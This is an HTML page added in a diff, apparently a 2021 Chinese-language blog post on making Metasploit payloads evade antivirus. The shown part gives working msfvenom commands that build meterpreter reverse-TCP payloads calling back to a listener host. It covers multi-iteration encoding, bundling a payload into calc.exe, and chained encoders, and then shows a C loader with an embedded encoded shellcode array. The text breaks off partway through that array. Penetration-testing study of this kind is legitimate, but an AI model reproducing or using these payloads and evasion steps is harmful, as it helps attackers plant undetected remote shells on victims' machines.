@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="findream's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x0 前言&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;最近在学习Metasploit相关的东西，主要是基于msfvenom免杀相关的学习，由于免杀技术日新月异，更新速度快。所以本文只抛砖引玉。欢迎各位师傅探讨交流学习。 0x1 Metasploit基础知识&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Metasploit Framework">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit免杀和检测的一些思考">
+<meta property="og:url" content="https://findream.github.io/2021/04/05/Metasploit免杀和检测的一些新思考/index.html">
+<meta property="og:site_name" content="findream&#39;s blog">
+<meta property="og:description" content="0x0 前言&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;最近在学习Metasploit相关的东西，主要是基于msfvenom免杀相关的学习，由于免杀技术日新月异，更新速度快。所以本文只抛砖引玉。欢迎各位师傅探讨交流学习。 0x1 Metasploit基础知识&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Metasploit Framework">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://hacky.wang/blog/20210504/Xbwd6zxypVJ3.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210504/71pFr6T8OILN.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210505/rtFOkjfDht9E.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210505/v77hAFEmNgTS.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210829/OiAyqzupMi48.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210829/l0CM0RnhJcll.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210829/GLP47aq5u0qE.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210829/eU5VxoqKJB8I.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210829/5n0auwYB7zqj.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210829/OFju6eyJjpFU.png?imageslim">
+<meta property="og:updated_time" content="2021-11-02T13:39:02.294Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metasploit免杀和检测的一些思考">
+<meta name="twitter:description" content="0x0 前言&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;最近在学习Metasploit相关的东西，主要是基于msfvenom免杀相关的学习，由于免杀技术日新月异，更新速度快。所以本文只抛砖引玉。欢迎各位师傅探讨交流学习。 0x1 Metasploit基础知识&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Metasploit Framework">
+<meta name="twitter:image" content="http://hacky.wang/blog/20210504/Xbwd6zxypVJ3.png?imageslim">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://findream.github.io/2021/04/05/Metasploit免杀和检测的一些新思考/"/>
+
+
+
+
+
+  <title>Metasploit免杀和检测的一些思考 | findream's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">findream's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findream.github.io/2021/04/05/Metasploit免杀和检测的一些新思考/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="findream">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="findream's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Metasploit免杀和检测的一些思考</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-04-05T15:02:11+08:00">
+                2021-04-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近在学习Metasploit相关的东西，主要是基于msfvenom免杀相关的学习，由于免杀技术日新月异，更新速度快。所以本文只抛砖引玉。欢迎各位师傅探讨交流学习。</p>
+<h2 id="0x1-Metasploit基础知识"><a href="#0x1-Metasploit基础知识" class="headerlink" title="0x1 Metasploit基础知识"></a>0x1 Metasploit基础知识</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Metasploit Framework 简称msf，是一款开源的渗透测试平台框架，其开源地址位于<a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework</a>。Metasploit是跨平台的渗透测试框架，可以运行在windows，linux，macos操作系统下。以kali为例，Metasploit的路径位于/usr/share/metasploit-framework。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lib目录包含metasploit的一些基本库文件，其中值得关注的是msf。这些主要是实现Metasploit的主要代码。<br>   <img src="http://hacky.wang/blog/20210504/Xbwd6zxypVJ3.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;modules目录包含了渗透测试各个环节功能的模块，包含辅助模块(auxiliary)，渗透攻击模块(exploits),后渗透攻击模块(post)，空指令模块(nops)和编码器模块(encoders)。<br>   <img src="http://hacky.wang/blog/20210504/71pFr6T8OILN.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还有其他一些目录：plugins，tools，script等也同样重要，可以阅读《Metasploit渗透测试魔鬼训练营》进行了解。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Metasploit的payload(载荷)从传输模式上一共分为3种: singles(独立载荷)，stagers(传输器载荷),stage(传输体)。关于这三种载荷的区别很多文章也有提及。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfvenom是Metasploit的免杀模块，具体使用方法如下：<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Options:    </div><div class="line">-<span class="ruby">p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&amp;<span class="comment">#039;-&amp;#039;或者stdin指定     </span></span></div><div class="line"><span class="ruby">-l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all     </span></div><div class="line"><span class="ruby">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度     </span></div><div class="line"><span class="ruby">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)     </span></div><div class="line"><span class="ruby">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）     </span></div><div class="line"><span class="ruby">-a, --arch       &lt;architecture&gt;  指定payload的目标架构，这里x86是<span class="number">32</span>位，x64是<span class="number">64</span>位      </span></div><div class="line"><span class="ruby">-platform       &lt;platform&gt;      指定payload的目标平台     </span></div><div class="line"><span class="ruby">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度     </span></div><div class="line"><span class="ruby">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;<span class="comment">#039;\x00\xff&amp;#039;     </span></span></div><div class="line"><span class="ruby">-i, --iterations &lt;count&gt;         指定payload的编码次数     </span></div><div class="line"><span class="ruby">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件     </span></div><div class="line"><span class="ruby">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板     </span></div><div class="line"><span class="ruby">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行         </span></div><div class="line"><span class="ruby">--payload-options                列举payload的标准选项     </span></div><div class="line"><span class="ruby">-o, --out        &lt;path&gt;          保存payload     </span></div><div class="line"><span class="ruby">-v, --var-name   &lt;name&gt;          指定一个自定义的变量，以确定输出格式         </span></div><div class="line"><span class="ruby">--shellest                       最小化生成payload     </span></div><div class="line"><span class="ruby">-h, --help                       查看帮助选项         </span></div><div class="line"><span class="ruby">--help-formats                   查看msf支持的输出格式列表</span></div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;而现在常见的免杀套路主要是以下几种类型：</p>
+<ul>
+<li>采用自编码的免杀方案</li>
+<li>捆绑正常的软件的免杀方案</li>
+<li>捆绑加自编码的免杀方案</li>
+<li>多重编码的免杀方案</li>
+<li>生成shellcode的免杀方案</li>
+</ul>
+<h2 id="0x2-我的免杀学习之路"><a href="#0x2-我的免杀学习之路" class="headerlink" title="0x2 我的免杀学习之路"></a>0x2 我的免杀学习之路</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文采用最常见的payload：windows/meterpreter/reverse_tcp。测试免杀的效果。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，采用自编码的免杀方案，这个方案的免杀强度取决于编码器的加密强度。但是随着yara规则的使用，单纯的依靠编码器进行免杀已经很容易被查杀了。<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">root@kali:~<span class="comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.199.237 -e x86/shikata_ga_nai -b '\x00' -i 10 -f exe &gt; reverse_tcp_encoder.exe</span></div><div class="line">No <span class="built_in">platform</span> was selected, choosing Msf::Module::Platform::Windows <span class="built_in">from</span> <span class="keyword">the</span> payload</div><div class="line">No Arch selected, selecting Arch: x86 <span class="built_in">from</span> <span class="keyword">the</span> payload</div><div class="line">Found <span class="number">1</span> compatible encoders</div><div class="line">Attempting <span class="built_in">to</span> encode payload <span class="keyword">with</span> <span class="number">10</span> iterations <span class="keyword">of</span> x86/shikata_ga_nai</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">360</span> (iteration=<span class="number">0</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">387</span> (iteration=<span class="number">1</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">414</span> (iteration=<span class="number">2</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">441</span> (iteration=<span class="number">3</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">468</span> (iteration=<span class="number">4</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">495</span> (iteration=<span class="number">5</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">522</span> (iteration=<span class="number">6</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">549</span> (iteration=<span class="number">7</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">576</span> (iteration=<span class="number">8</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">603</span> (iteration=<span class="number">9</span>)</div><div class="line">x86/shikata_ga_nai chosen <span class="keyword">with</span> final size <span class="number">603</span></div><div class="line">Payload size: <span class="number">603</span> <span class="keyword">bytes</span></div><div class="line">Final size <span class="keyword">of</span> exe <span class="built_in">file</span>: <span class="number">73802</span> <span class="keyword">bytes</span></div></pre></td></tr></table></figure></p>
+<p>   <img src="http://hacky.wang/blog/20210505/rtFOkjfDht9E.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;基于捆绑正常软件的免杀方案也有着不错的免杀效果，但是还有继续改进的余地。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=192.168.199.237 -x Desktop/calc.exe -f exe &gt; Documents/reverse_tcp_kunbang.exe</div><div class="line"><span class="literal">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class="keyword">from</span> the payload</div><div class="line"><span class="literal">No</span> Arch selected, selecting Arch: x86 <span class="keyword">from</span> the payload</div><div class="line"><span class="literal">No</span> encoder <span class="keyword">or</span> badchars specified, outputting<span class="built_in"> raw </span>payload</div><div class="line">Payload size: 333 bytes</div><div class="line">Final size of exe file: 26112 bytes</div></pre></td></tr></table></figure></p>
+<p>   <img src="http://hacky.wang/blog/20210505/v77hAFEmNgTS.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用多编码形式的shellcode生成的msfvenom<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">237.128</span> LPORT=<span class="number">4444</span> -e <span class="keyword">x</span><span class="number">86</span>/shikata_ga_nai -i <span class="number">3</span> -b '\<span class="keyword">x</span><span class="number">00</span>' -f raw | msfvenom -e <span class="keyword">x</span><span class="number">86</span>/countdown -i <span class="number">3</span> -a <span class="keyword">x</span><span class="number">86</span> --platform windows -f <span class="keyword">c</span> &gt; Desktop/payload<span class="number">2</span>.<span class="keyword">c</span></div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后将其编译成可执行文件，执行，但效果也不是很好<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">#pragma comment(linker, "/section:.data,RWE")  </div><div class="line">unsigned char lpBinBuffer[] =</div><div class="line">"<span class="symbol">\x</span>b9<span class="symbol">\x</span>c1<span class="symbol">\x</span>01<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>e8<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>c1<span class="symbol">\x</span>5e<span class="symbol">\x</span>30<span class="symbol">\x</span>4c<span class="symbol">\x</span>0e"</div><div class="line">"<span class="symbol">\x</span>07<span class="symbol">\x</span>e2<span class="symbol">\x</span>fa<span class="symbol">\x</span>b8<span class="symbol">\x</span>ad<span class="symbol">\x</span>02<span class="symbol">\x</span>04<span class="symbol">\x</span>05<span class="symbol">\x</span>ee<span class="symbol">\x</span>f8<span class="symbol">\x</span>f7<span class="symbol">\x</span>f6<span class="symbol">\x</span>f5<span class="symbol">\x</span>ca<span class="symbol">\x</span>52"</div><div class="line">"<span class="symbol">\x</span>3d<span class="symbol">\x</span>42<span class="symbol">\x</span>01<span class="symbol">\x</span>17<span class="symbol">\x</span>f3<span class="symbol">\x</span>e8<span class="symbol">\x</span>ab<span class="symbol">\x</span>8b<span class="symbol">\x</span>17<span class="symbol">\x</span>12<span class="symbol">\x</span>12<span class="symbol">\x</span>f6<span class="symbol">\x</span>e1<span class="symbol">\x</span>ed<span class="symbol">\x</span>ed"</div><div class="line">"<span class="symbol">\x</span>e9<span class="symbol">\x</span>d7<span class="symbol">\x</span>4c<span class="symbol">\x</span>22<span class="symbol">\x</span>62<span class="symbol">\x</span>20<span class="symbol">\x</span>35<span class="symbol">\x</span>d0<span class="symbol">\x</span>cc<span class="symbol">\x</span>ee<span class="symbol">\x</span>f0<span class="symbol">\x</span>e8<span class="symbol">\x</span>4e<span class="symbol">\x</span>1f<span class="symbol">\x</span>c0"</div><div class="line">"<span class="symbol">\x</span>8b<span class="symbol">\x</span>98<span class="symbol">\x</span>db<span class="symbol">\x</span>22<span class="symbol">\x</span>dc<span class="symbol">\x</span>78<span class="symbol">\x</span>10<span class="symbol">\x</span>d5<span class="symbol">\x</span>ac<span class="symbol">\x</span>67<span class="symbol">\x</span>36<span class="symbol">\x</span>72<span class="symbol">\x</span>1b<span class="symbol">\x</span>89<span class="symbol">\x</span>c9"</div><div class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>06<span class="symbol">\x</span>7c<span class="symbol">\x</span>19<span class="symbol">\x</span>ea<span class="symbol">\x</span>5a<span class="symbol">\x</span>2c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>c6<span class="symbol">\x</span>8c<span class="symbol">\x</span>f6<span class="symbol">\x</span>fd<span class="symbol">\x</span>43<span class="symbol">\x</span>ca"</div><div class="line">"<span class="symbol">\x</span>2a<span class="symbol">\x</span>8e<span class="symbol">\x</span>a9<span class="symbol">\x</span>2c<span class="symbol">\x</span>ec<span class="symbol">\x</span>cb<span class="symbol">\x</span>fe<span class="symbol">\x</span>45<span class="symbol">\x</span>c0<span class="symbol">\x</span>ec<span class="symbol">\x</span>5b<span class="symbol">\x</span>7e<span class="symbol">\x</span>2d<span class="symbol">\x</span>fa<span class="symbol">\x</span>99"</div><div class="line">"<span class="symbol">\x</span>fc<span class="symbol">\x</span>eb<span class="symbol">\x</span>48<span class="symbol">\x</span>95<span class="symbol">\x</span>2a<span class="symbol">\x</span>41<span class="symbol">\x</span>40<span class="symbol">\x</span>df<span class="symbol">\x</span>f8<span class="symbol">\x</span>18<span class="symbol">\x</span>be<span class="symbol">\x</span>49<span class="symbol">\x</span>6c<span class="symbol">\x</span>29<span class="symbol">\x</span>eb"</div><div class="line">"<span class="symbol">\x</span>d2<span class="symbol">\x</span>91<span class="symbol">\x</span>c6<span class="symbol">\x</span>94<span class="symbol">\x</span>2e<span class="symbol">\x</span>74<span class="symbol">\x</span>5a<span class="symbol">\x</span>05<span class="symbol">\x</span>4f<span class="symbol">\x</span>e5<span class="symbol">\x</span>1d<span class="symbol">\x</span>b4<span class="symbol">\x</span>47<span class="symbol">\x</span>31<span class="symbol">\x</span>ca"</div><div class="line">"<span class="symbol">\x</span>e9<span class="symbol">\x</span>dc<span class="symbol">\x</span>3a<span class="symbol">\x</span>42<span class="symbol">\x</span>69<span class="symbol">\x</span>a0<span class="symbol">\x</span>a5<span class="symbol">\x</span>2d<span class="symbol">\x</span>4f<span class="symbol">\x</span>74<span class="symbol">\x</span>99<span class="symbol">\x</span>87<span class="symbol">\x</span>e4<span class="symbol">\x</span>08<span class="symbol">\x</span>b5"</div><div class="line">"<span class="symbol">\x</span>52<span class="symbol">\x</span>e6<span class="symbol">\x</span>0c<span class="symbol">\x</span>97<span class="symbol">\x</span>50<span class="symbol">\x</span>d9<span class="symbol">\x</span>7b<span class="symbol">\x</span>71<span class="symbol">\x</span>d7<span class="symbol">\x</span>40<span class="symbol">\x</span>46<span class="symbol">\x</span>71<span class="symbol">\x</span>48<span class="symbol">\x</span>a9<span class="symbol">\x</span>a0"</div><div class="line">"<span class="symbol">\x</span>4c<span class="symbol">\x</span>e2<span class="symbol">\x</span>92<span class="symbol">\x</span>51<span class="symbol">\x</span>f9<span class="symbol">\x</span>5f<span class="symbol">\x</span>98<span class="symbol">\x</span>52<span class="symbol">\x</span>97<span class="symbol">\x</span>82<span class="symbol">\x</span>63<span class="symbol">\x</span>a2<span class="symbol">\x</span>4d<span class="symbol">\x</span>ec<span class="symbol">\x</span>ee"</div><div class="line">"<span class="symbol">\x</span>e2<span class="symbol">\x</span>04<span class="symbol">\x</span>d9<span class="symbol">\x</span>36<span class="symbol">\x</span>19<span class="symbol">\x</span>94<span class="symbol">\x</span>dd<span class="symbol">\x</span>9d<span class="symbol">\x</span>bf<span class="symbol">\x</span>30<span class="symbol">\x</span>5f<span class="symbol">\x</span>50<span class="symbol">\x</span>22<span class="symbol">\x</span>91<span class="symbol">\x</span>7a"</div><div class="line">"<span class="symbol">\x</span>24<span class="symbol">\x</span>0b<span class="symbol">\x</span>d0<span class="symbol">\x</span>8a<span class="symbol">\x</span>bd<span class="symbol">\x</span>41<span class="symbol">\x</span>39<span class="symbol">\x</span>96<span class="symbol">\x</span>b8<span class="symbol">\x</span>8d<span class="symbol">\x</span>88<span class="symbol">\x</span>a7<span class="symbol">\x</span>8b<span class="symbol">\x</span>a5<span class="symbol">\x</span>4c"</div><div class="line">"<span class="symbol">\x</span>7e<span class="symbol">\x</span>c6<span class="symbol">\x</span>64<span class="symbol">\x</span>54<span class="symbol">\x</span>b1<span class="symbol">\x</span>f1<span class="symbol">\x</span>5b<span class="symbol">\x</span>e4<span class="symbol">\x</span>a6<span class="symbol">\x</span>7c<span class="symbol">\x</span>82<span class="symbol">\x</span>d1<span class="symbol">\x</span>47<span class="symbol">\x</span>8d<span class="symbol">\x</span>5e"</div><div class="line">"<span class="symbol">\x</span>eb<span class="symbol">\x</span>71<span class="symbol">\x</span>73<span class="symbol">\x</span>8a<span class="symbol">\x</span>87<span class="symbol">\x</span>d3<span class="symbol">\x</span>52<span class="symbol">\x</span>6a<span class="symbol">\x</span>69<span class="symbol">\x</span>49<span class="symbol">\x</span>e7<span class="symbol">\x</span>db<span class="symbol">\x</span>a5<span class="symbol">\x</span>92<span class="symbol">\x</span>4e"</div><div class="line">"<span class="symbol">\x</span>b9<span class="symbol">\x</span>0c<span class="symbol">\x</span>8f<span class="symbol">\x</span>6b<span class="symbol">\x</span>56<span class="symbol">\x</span>83<span class="symbol">\x</span>5c<span class="symbol">\x</span>a1<span class="symbol">\x</span>7c<span class="symbol">\x</span>d6<span class="symbol">\x</span>af<span class="symbol">\x</span>3b<span class="symbol">\x</span>78<span class="symbol">\x</span>40<span class="symbol">\x</span>68"</div><div class="line">"<span class="symbol">\x</span>85<span class="symbol">\x</span>95<span class="symbol">\x</span>17<span class="symbol">\x</span>d2<span class="symbol">\x</span>33<span class="symbol">\x</span>51<span class="symbol">\x</span>d8<span class="symbol">\x</span>eb<span class="symbol">\x</span>b7<span class="symbol">\x</span>41<span class="symbol">\x</span>e0<span class="symbol">\x</span>d3<span class="symbol">\x</span>a7<span class="symbol">\x</span>d5<span class="symbol">\x</span>59"</div><div class="line">"<span class="symbol">\x</span>6b<span class="symbol">\x</span>67<span class="symbol">\x</span>3d<span class="symbol">\x</span>cf<span class="symbol">\x</span>1d<span class="symbol">\x</span>d8<span class="symbol">\x</span>89<span class="symbol">\x</span>d5<span class="symbol">\x</span>0d<span class="symbol">\x</span>d3<span class="symbol">\x</span>8b<span class="symbol">\x</span>4a<span class="symbol">\x</span>16<span 